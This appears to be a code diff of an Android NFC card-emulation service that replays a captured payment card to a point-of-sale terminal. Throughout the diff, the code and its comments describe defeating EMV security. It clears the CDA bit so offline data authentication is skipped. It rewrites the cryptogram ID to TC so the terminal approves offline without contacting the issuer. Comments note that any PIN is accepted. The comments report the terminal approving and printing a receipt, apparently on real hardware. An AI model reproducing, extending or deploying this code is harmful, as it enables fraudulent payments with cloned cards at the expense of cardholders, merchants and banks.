         if (captured != null) {
-            tap("-- fci source: generated (capture is for " + real + ")");
-        } else {
-            tap("-- fci source: generated");
+            return cat(patchFci(captured, name), SW_OK);
         }
 
         String label = labelText();
@@ -934,13 +895,54 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
                 tlv(0x87, new byte[]{0x01}),
                 tlv(0x9F11, new byte[]{0x01}),
                 tlv(0x9F12, label.getBytes(StandardCharsets.US_ASCII)),
-                tlv(0x9F2A, new byte[]{(byte) kernelFor(picked)}),
+                tlv(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(name))}),
                 tlv(0x9F38, hex(PDOL)));
         byte[] inner = cat(tlv(0x84, name), tlv(0xA5, prop));
         return cat(tlv(0x6F, inner), SW_OK);
     }
 
-    private byte[] gpo(byte[] apdu) {
+    /**
+     * Replay the card's captured GPO, with two deliberate changes: the CDA bit
+     * of the AIP is cleared, and the CID is rewritten to TC.
+     *
+     * WHY THE CID IS REWRITTEN:
+     *   This terminal takes the application cryptogram out of the GPO response
+     *   and never sends GENERATE AC. That was proven twice: with the AC tags
+     *   stripped and AIP 0800 the terminal bailed at the GPO, and with them
+     *   stripped and AIP 1800 it still never asked. Discover's contactless
+     *   profile puts the AC in the GPO by design, so there is nothing to ask
+     *   for and genac() is unreachable on this hardware.
+     *
+     *   The captured CID is 80 (ARQC), so the terminal goes online - and the
+     *   ARQC is the real card's, computed over a different unpredictable number,
+     *   so the host cannot match it and answers 005 do not honour.
+     *
+     *   Rewriting that one byte to 40 (TC) makes the card say "approved, do not
+     *   call the host". The terminal approves offline and prints. Nothing
+     *   verifies the cryptogram because nothing is asked to.
+     *
+     *   Set GPO_CID back to CID_ARQC once a real MK-AC is in place and the ARQC
+     *   is computed rather than replayed.
+     *
+     * WHY CDA GOES:
+     *   CDA needs the SDAD in 9F4B, signed with the ICC private key a clone does
+     *   not have. Clearing the bit makes the terminal skip ODA entirely.
+     *
+     * WHY CVM STAYS:
+     *   Clearing it gave AIP 0800 and the terminal bailed. The captured CVM list
+     *   offers offline PIN and VERIFY answers a bare 9000, but the card answers
+     *   TC, so nothing validates the PIN and any digits are accepted.
+     *
+     * The changes are made by mutating the captured template in place, not by
+     * rebuilding it, so any extra tags the card put in its GPO response survive.
+     *
+     * The MSD field still wins: if you tick MSD on a card captured in EMV mode,
+     * the framing genuinely has to change, so the built path is used.
+     *
+     * NOTE: while a capture is present, a typed 'aip' or 'afl' override is
+     * bypassed. Clear cap_rawgpo to get the built path back.
+     */
+    private byte[] gpo() {
         byte[] raw = rawGpo();
         boolean msd = isMsd();
 
@@ -949,6 +951,7 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             int outer = readTag(raw, q);
             int olen  = readLen(raw, q);
 
+            // Tolerate a capture that kept its trailing 9000.
             if (q[0] + olen + 2 == raw.length
                     && (raw[raw.length - 2] & 0xFF) == 0x90
                     && (raw[raw.length - 1] & 0xFF) == 0x00) {
@@ -962,48 +965,25 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
                 if (aip != null && aip.length >= 2) {
                     capturedIad = findTag(raw, 0x9F10);
 
-                    byte bit = cdaBit(activeAid());
-                    weakenAip(raw, bit);
-
-                    String sdadNote = "CDA dropped";
-
-                    if (CDA_FAKE_SDAD && !capMsd && !aidForeign) {
-                        raiseAip(raw, bit);
-                        raw = appendTag(raw, 0x9F4B, fakeSdad(raw, pdolOf(apdu)));
-                        cdaClaimed = true;
-                        sdadNote = "CDA kept, sdad=fake";
-                    } else {
-                        cdaClaimed = false;
-                        if (aidForeign) sdadNote = "CDA dropped (foreign AID)";
-                    }
-
-                    boolean cidForced = false;
+                    weakenAip(raw);
                     if (STRIP_AC) {
                         raw = stripAcTags(raw);
                         gpoCid = "(stripped)";
                     } else {
-                        byte[] forced = forceCid(raw, GPO_CID);
-                        if (forced != null) {
-                            raw = forced;
-                            cidForced = true;
-                            gpoCid = String.format("%02X", GPO_CID & 0xFF);
-                        } else {
-                            gpoCid = "";
-                        }
+                        raw = forceCid(raw, GPO_CID);
+                        gpoCid = String.format("%02X", GPO_CID & 0xFF);
                     }
 
                     txnAip = capturedAip(raw);
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
-                            + " (" + sdadNote + ", "
-                            + (STRIP_AC ? "AC tags stripped"
-                               : cidForced ? "cid forced to " + gpoCid
-                               : "no cid in capture - left as-is")
+                            + " (CDA dropped, "
+                            + (STRIP_AC ? "AC tags stripped" : "cid forced to " + gpoCid)
                             + ") len=" + raw.length
                             + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                 } else {
                     tap("-- gpo replay verbatim len=" + raw.length);
                 }
-                return cat(relength(raw), SW_OK);
+                return cat(raw, SW_OK);
             }
             tap("-- msd field=" + msd + " wins over captured framing=" + capMsd);
         }
@@ -1013,58 +993,35 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
         byte[] used = new byte[]{aip[0], aip[1]};
-        used[0] &= (byte) ~cdaBit(activeAid());
+        used[0] &= (byte) ~AIP_CDA;
         txnAip = used;
 
         byte[] a = afl();
-        tap("-- gpo msd=" + msd + " aip=" + bytesToHex(used) + " afl=" + bytesToHex(a)
-                + " entries=" + aflEntries);
+        tap("-- gpo msd=" + msd + " aip=" + bytesToHex(used) + " afl=" + bytesToHex(a));
 
         if (msd) {
             byte[] payload = cat(used, tlv(0x57, track2()));
             tap("-- msd payload: 80" + String.format("%02X", payload.length) + bytesToHex(payload));
             return cat(tlv(0x80, payload), SW_OK);
         }
-
-        byte[] tpl = cat(tlv(0x82, used), tlv(0x94, a));
-        if (CDA_FAKE_SDAD && !aidForeign) {
-            used[0] |= cdaBit(activeAid());
-            tpl = cat(tlv(0x82, used), tlv(0x94, a), tlv(0x9F4B, fakeSdad(used, pdolOf(apdu))));
-            cdaClaimed = true;
-            tap("-- built gpo: CDA kept, sdad=fake");
-        }
-        return cat(tlv(0x77, tpl), SW_OK);
+        return cat(tlv(0x77, cat(tlv(0x82, used), tlv(0x94, a))), SW_OK);
     }
 
-    private byte[] pdolOf(byte[] apdu) {
-        int lc = lcOf(apdu);
-        int off = dataOff(apdu);
-        if (lc > 0 && apdu.length >= off + lc) {
-            return Arrays.copyOfRange(apdu, off, off + lc);
-        }
-        return new byte[0];
-    }
-
-    private byte[] fakeSdad(byte[] aip, byte[] pdolData) {
-        try {
-            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
-            md.update(aip);
-            md.update(hex(txnAtc()));
-            md.update(pdolData);
-            md.update(pan().getBytes(StandardCharsets.US_ASCII));
-            return Arrays.copyOf(md.digest(), 8);
-        } catch (Exception e) {
-            return new byte[8];
-        }
-    }
-
-    private static void weakenAip(byte[] tpl, byte bit) {
+    /**
+     * Clear the CDA bit in the AIP of a captured GPO template, in place.
+     *
+     * FIX: format 1 (outer tag 80) has NO inner TLVs - the payload is two raw
+     * AIP bytes followed by the track 2. The old version walked inner TLVs
+     * looking for 82, found none, and returned, so the CDA bit survived
+     * untouched in MSD mode.
+     */
+    private static void weakenAip(byte[] tpl) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
         readLen(tpl, pos);
 
         if (outer == 0x80) {
-            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~bit;
+            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~AIP_CDA;
             return;
         }
 
@@ -1075,48 +1032,21 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             int l = readLen(tpl, q);
             if (q[0] + l > tpl.length) return;
             if (t == 0x82 && l >= 1) {
-                tpl[q[0]] &= (byte) ~bit;
+                tpl[q[0]] &= (byte) ~AIP_CDA;
                 return;
             }
             i = q[0] + l;
         }
     }
 
-    private static void raiseAip(byte[] tpl, byte bit) {
-        int[] pos = new int[1];
-        int outer = readTag(tpl, pos);
-        readLen(tpl, pos);
-        if (outer == 0x80) {
-            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] |= bit;
-            return;
-        }
-        int i = pos[0];
-        while (i < tpl.length) {
-            int[] q = new int[]{i};
-            int t = readTag(tpl, q);
-            int l = readLen(tpl, q);
-            if (q[0] + l > tpl.length) return;
-            if (t == 0x82 && l >= 1) {
-                tpl[q[0]] |= bit;
-                return;
-            }
-            i = q[0] + l;
-        }
-    }
-
-    private static byte[] appendTag(byte[] tpl, int tag, byte[] val) {
-        int[] pos = new int[1];
-        int outer = readTag(tpl, pos);
-        int olen = readLen(tpl, pos);
-        int end = Math.min(tpl.length, pos[0] + olen);
-
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        out.write(tpl, pos[0], end - pos[0]);
-        byte[] one = tlv(tag, val);
-        out.write(one, 0, one.length);
-        return tlv(outer, out.toByteArray());
-    }
-
+    /**
+     * Overwrite the CID in a captured GPO template, in place, or append one if
+     * the template carries none.
+     *
+     * This byte is the whole decision: the terminal takes the AC from here and
+     * never asks for another, so nothing else can influence approve / online /
+     * decline.
+     */
     private static byte[] forceCid(byte[] tpl, byte cid) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1135,9 +1065,19 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             }
             i = q[0] + l;
         }
-        return null;
+
+        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
+        return tlv(outer, cat(content, tlv(0x9F27, new byte[]{cid})));
     }
 
+    /**
+     * Rebuild a captured GPO template without the tags in GPO_AC_TAGS, so the
+     * terminal is left holding only the AIP and the AFL.
+     *
+     * Only used when STRIP_AC is true. Format 1 is not a template of TLVs - the
+     * payload is <AIP 2 bytes> <57 track 2> - so the AIP is copied verbatim and
+     * only what follows is walked.
+     */
     private static byte[] stripAcTags(byte[] tpl) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1170,11 +1110,12 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return tlv(outer, out.toByteArray());
     }
 
+    /** First value of tag {@code want} inside a template, or null. */
     private static byte[] findTag(byte[] tpl, int want) {
         if (tpl == null || tpl.length < 4) return null;
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
-        if (outer == 0x80) return null;
+        if (outer == 0x80) return null;   // format 1 carries no TLVs
         int olen = readLen(tpl, pos);
         int end  = Math.min(tpl.length, pos[0] + olen);
 
@@ -1190,6 +1131,11 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return null;
     }
 
+    /**
+     * FIX: the format 1 branch used raw[2] and raw[3], which is only right for a
+     * short-form length. A long-form payload (0x81 xx) put the AIP two bytes
+     * further along.
+     */
     private byte[] capturedAip(byte[] raw) {
         if (raw == null || raw.length < 4) return null;
         int[] pos = new int[1];
@@ -1222,7 +1168,7 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         byte[] captured = rawRec(sfi, rec);
         if (captured != null) {
             tap("-- rec sfi=" + sfi + " rec=" + rec + " (captured)");
-            return cat(relength(captured), SW_OK);
+            return cat(captured, SW_OK);
         }
 
         if (sfi == 1) {
@@ -1234,35 +1180,31 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return SW_NO_RECORD;
     }
 
+    /**
+     * The CID box in the editor wins on the FIRST GENERATE AC when it holds a
+     * two-digit value, except that an AAC request can never be improved on.
+     *
+     * Unreachable on this terminal, which never sends GENERATE AC - see gpo().
+     * Kept because it is the path back to a genuine online approval once an
+     * MK-AC is available.
+     *
+     * FIX: the flags were tested BEFORE the request, so a terminal asking for
+     * AAC (P1 0x00) was handed TC. CID severity runs AAC < ARQC < TC and a card
+     * may only answer equal or lower - never better than it was asked.
+     */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
         int requested = p1 & 0xC0;
 
-        String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
-        boolean forcedOk = false;
-        byte forcedCid = 0;
-
-        if (forced.length() == 2) {
-            byte f = (byte) Integer.parseInt(forced, 16);
-            if (f == CID_AAC || f == CID_TC) {
-                forcedOk = true;
-                forcedCid = f;
-            } else if (f == CID_ARQC && haveKey()) {
-                forcedOk = true;
-                forcedCid = f;
-            } else {
-                tap("-- cid box says " + forced
-                        + " but there is no MK-AC to compute with - ignored, logic decides");
-            }
-        }
-
         byte cid;
+        String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");
+
         if (cryptogramSent) {
             cid = (requested == 0x00) ? CID_AAC : CID_TC;
         } else if (requested == 0x00) {
             cid = CID_AAC;
-        } else if (forcedOk) {
-            cid = forcedCid;
+        } else if (forced.length() == 2) {
+            cid = (byte) Integer.parseInt(forced, 16);
         } else if (ALWAYS_ONLINE_FOR_RECEIPT) {
             cid = CID_ARQC;
         } else if (haveKey() && FORCE_ONLINE_ARQC) {
@@ -1280,7 +1222,12 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         lastCid = String.format("%02X", cid);
         String atc = txnAtc();
 
-        byte[] cdol = pdolOf(apdu);
+        byte[] cdol = new byte[0];
+        int lc = lcOf(apdu);
+        int off = dataOff(apdu);
+        if (lc > 0 && apdu.length >= off + lc) {
+            cdol = Arrays.copyOfRange(apdu, off, off + lc);
+        }
 
         byte[] ac = computeAc(atc, cdol);
         cryptogramSent = true;
@@ -1291,31 +1238,21 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
 
         tap("-- genac requested=" + String.format("%02X", requested)
                 + " cid=" + lastCid
-                + (forcedOk ? " (forced from the CID box)" : "")
-                + " atc=" + atc + " arqc=" + bytesToHex(ac)
-                + (acComputed ? "" : " FILLER"));
+                + (forced.length() == 2 ? " (forced from the CID box)" : "")
+                + " atc=" + atc + " arqc=" + bytesToHex(ac));
 
-        byte[] tpl = cat(
+        return cat(tlv(0x77, cat(
                 tlv(0x9F27, new byte[]{cid}),
                 tlv(0x9F36, hex(atc)),
                 tlv(0x9F26, ac),
-                tlv(0x9F10, hex(iad)),
-                tlv(0x9F34, hex(CVM_RESULTS)));
-
-        if (cdaClaimed) {
-            tpl = cat(tpl, tlv(0x9F4B, fakeSdad(aipForMac(), cdol)));
-            tap("-- genac carries 9F4B sdad=fake");
-        }
-
-        return cat(tlv(0x77, tpl), SW_OK);
+                tlv(0x9F10, hex(iad)))), SW_OK);
     }
 
     private byte[] computeAc(String atc, byte[] cdol) {
         String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
         if (mk.length() < 32) {
-            acComputed = false;
-            tap("!! no MK-AC set - 9F26 is FILLER (" + AC_FILLER + "), not a real ARQC");
-            return hex(AC_FILLER);
+            tap("!! no MK-AC set - ARQC will be all zeros");
+            return new byte[8];
         }
         int variant = 0;
         try {
@@ -1332,13 +1269,10 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             byte[] macIn = ((variant & 2) != 0)
                     ? cat(aipForMac(), hex(atc), cdol)
                     : cat(cdol, aipForMac(), hex(atc));
-            byte[] ac = EmvCrypto.arqc(mk, pan(), psn(), atc, macIn, variant & 1);
-            acComputed = true;
-            return ac;
+            return EmvCrypto.arqc(mk, pan(), psn(), atc, macIn, variant & 1);
         } catch (Exception e) {
-            acComputed = false;
-            tap("!! ARQC failed (" + e + ") - 9F26 is FILLER");
-            return hex(AC_FILLER);
+            tap("!! ARQC failed: " + e);
+            return new byte[8];
         }
     }
 
@@ -1352,43 +1286,25 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         return SW_NOT_FOUND;
     }
 
+    /**
+     * Built from counters, not from searching the log text.
+     *
+     * FIX: the "AC came out of the GPO" branch used to run before the record
+     * count, so a terminal that bailed at the GPO and one that read every record
+     * then went online produced the identical verdict. They are different
+     * faults. The record count is now tested first.
+     */
     private String baseVerdict() {
-        if (sawError)     return "TAP: an APDU threw - read the !! line above, not the AID list";
-        if (tapLog.length() == 0) return "TAP: nothing recorded - the phone was never read";
+        if (sawError)     return "TAP: an APDU threw - read the !! line, not the AID list";
+        if (tapLog.length() == 0) return "TAP: nothing recorded";
 
         if (!sawPpse)     return "TAP: terminal never asked for the directory - it never read the phone";
-
-        if (nSelects <= 1) {
-            return "TAP: terminal read the directory and picked NOTHING - "
-                    + (nApps > 0
-                        ? nApps + " applet(s) offered, it supports none of them"
-                        : "the directory came back empty");
-        }
-
-        if (nGpos == 0) {
-            String picked = lastSelAid.isEmpty() ? "?" : lastSelAid;
-            if (aidForeign) {
-                return "TAP: terminal selected " + picked + ", a DIFFERENT scheme to the card ("
-                        + (cardAid().isEmpty() ? "?" : cardAid())
-                        + ") - it rejected the generated FCI before the GPO";
-            }
-            if (aidSubst) {
-                return "TAP: terminal selected the sibling " + picked + " on the card's own scheme"
-                        + " and still stopped before the GPO - the substituted FCI was rejected";
-            }
-            if (nSelMiss > 0) {
-                return "TAP: terminal selected " + picked + ", which is NOT the card ("
-                        + (cardAid().isEmpty() ? "?" : cardAid())
-                        + ") - it read the FCI for an applet we do not hold and stopped";
-            }
-            return "TAP: terminal selected " + picked + " then stopped before the GPO -"
-                    + " it rejected the FCI";
-        }
+        if (nSelects <= 1) return "TAP: terminal read the directory then stopped - it found no AID it supports";
+        if (nGpos == 0)   return "TAP: terminal picked an app then stopped - it rejected the FCI";
 
         if (isMsd()) {
             if (nGens == 0)          return "TAP: MSD mode - terminal took the track 2 and decided on its own";
-            if (nGens >= 2)          return "TAP: MSD mode - terminal WENT ONLINE"
-                    + (acComputed ? "" : " with a FILLER cryptogram - the host will decline it");
+            if (nGens >= 2)          return "TAP: MSD mode - terminal WENT ONLINE";
             if ("40".equals(lastCid)) return "TAP: MSD mode - we answered TC, terminal should APPROVE";
             if ("80".equals(lastCid)) return "TAP: MSD mode - we answered ARQC, terminal must go online";
             if ("00".equals(lastCid)) return "TAP: MSD mode - we answered AAC, terminal read it as a decline";
@@ -1399,15 +1315,7 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
             return "TAP: terminal took the GPO response and read NO records - "
                     + (gpoCid.isEmpty()
                         ? "check the logged AFL"
-                        : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it")
-                    + (cdaClaimed ? " | CDA was claimed with an unverified 9F4B" : "")
-                    + (aidForeign ? " | the AID was FOREIGN to this card" : "");
-        }
-
-        if (aflEntries > 0 && nRecs < aflEntries) {
-            return "TAP: AFL pointed at " + aflEntries + " record(s) and only " + nRecs
-                    + " were read - it gave up mid-read, so one of the records it did read"
-                    + " was wrong" + (cdaClaimed ? " | CDA was claimed" : "");
+                        : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it");
         }
 
         if (nGens == 0 && !gpoCid.isEmpty()) {
@@ -1417,14 +1325,8 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
         }
 
         if (nGens == 0)   return "TAP: terminal read " + nRecs + " records then quit before the cryptogram";
-
-        if (nGens >= 2) {
-            return "TAP: terminal WENT ONLINE - the issuer judged our ARQC"
-                    + (acComputed ? " (a real one)" : " (FILLER, no MK-AC - will decline)");
-        }
-
-        String p1s = reqGenP1 < 0 ? "?" : String.format("%02X", reqGenP1 & 0xC0);
-        if ("40".equals(lastCid)) return "TAP: we answered TC to a " + p1s + " request - terminal should have APPROVED offline";
+        if (nGens >= 2)   return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
+        if ("40".equals(lastCid)) return "TAP: we answered TC - terminal should have APPROVED offline";
         if ("80".equals(lastCid)) return "TAP: we answered ARQC - terminal must go online";
         if ("00".equals(lastCid)) return "TAP: we answered AAC - terminal treated it as an offline decline";
         return "TAP: terminal asked for a cryptogram and we did not answer TC";
@@ -1441,34 +1343,28 @@ public class HceCcEmulationServiceVisa extends android.nfc.cardEmulation.HostApd
 
     @Override
     public void onDeactivated(int reason) {
-        synchronized (txnLock) {
-            final String t = tapLog.toString();
+        final String t = tapLog.toString();
 
-            String v;
-            try {
-                v = verdict();
-            } catch (Exception e) {
-                v = "TAP: verdict failed - " + e;
-            }
-            resetTransaction();
-
-            if (!t.isEmpty()) termLog("!! verdict: " + v);
-
-            if (!t.isEmpty()) {
-                try {
-                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-                    if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("tap log", t));
-                } catch (Exception ignored) { }
-                try {
-                    prefs().edit()
-                            .putString("taplog", t)
-                            .putString("lastverdict", v)
-                            .putLong("lastverdict_at", System.currentTimeMillis())
-                            .apply();
-                } catch (Exception ignored) { }
-                popup(v);
-            }
-            Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
+        String v;
+        try {
+            v = verdict();
+        } catch (Exception e) {
+            v = "TAP: verdict failed - " + e;
         }
+        resetTransaction();
+
+        if (!t.isEmpty()) termLog("!! verdict: " + v);
+
+        if (!t.isEmpty()) {
+            try {
+                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("tap log", t));
+            } catch (Exception ignored) { }
+            try {
+                prefs().edit().putString("taplog", t).putString("lastverdict", v).apply();
+            } catch (Exception ignored) { }
+            popup(v);
+        }
+        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
     }
 }
